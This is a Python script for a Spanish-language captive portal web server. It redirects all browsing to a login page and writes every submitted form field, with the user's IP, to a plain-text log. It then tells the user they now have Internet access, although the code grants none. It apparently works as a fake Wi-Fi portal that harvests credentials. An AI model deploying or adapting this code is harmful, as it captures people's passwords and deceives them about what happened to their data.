import http.server
import socketserver
import urllib.parse
import json
import os
from datetime import datetime

PORT = 8080

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)

        if parsed_path.path in ['/', '/index.html', '/styles.css'] or parsed_path.path.endswith(('.css', '.js', '.png', '.jpg')):
            return super().do_GET()

        self.send_response(302)
        self.send_header('Location', f'http://localhost:{PORT}/index.html')
        self.end_headers()

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)

            user_ip = self.client_address[0]
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            log_entry = {
                "timestamp": timestamp,
                "ip": user_ip,
                "data": params
            }

            with open("connections.log", "a") as log_file:
                log_file.write(json.dumps(log_entry) + "\n")

            print(f"[{timestamp}] Nueva conexión desde {user_ip}")

            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            response_html = """
            <!DOCTYPE html>
            <html lang="es">
            <head>
                <meta charset="UTF-8">
                <title>Conectado</title>
                <style>
                    body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f2f5; }
                    .card { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    h1 { color: #2e7d32; }
                </style>
            </head>
            <body>
                <div class="card">
                    <h1>¡Conexión Exitosa!</h1>
                    <p>Ahora tienes acceso a Internet.</p>
                </div>
            </body>
            </html>
            """
            self.wfile.write(response_html.encode('utf-8'))
        else:
            self.send_error(404, "Ruta no encontrada")

if __name__ == "__main__":
    with socketserver.TCPServer(("0.0.0.0", PORT), CaptivePortalHandler) as httpd:
        print(f"Servidor del Portal Cautivo ejecutándose en el puerto {PORT}...")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nServidor detenido.")
            httpd.server_close()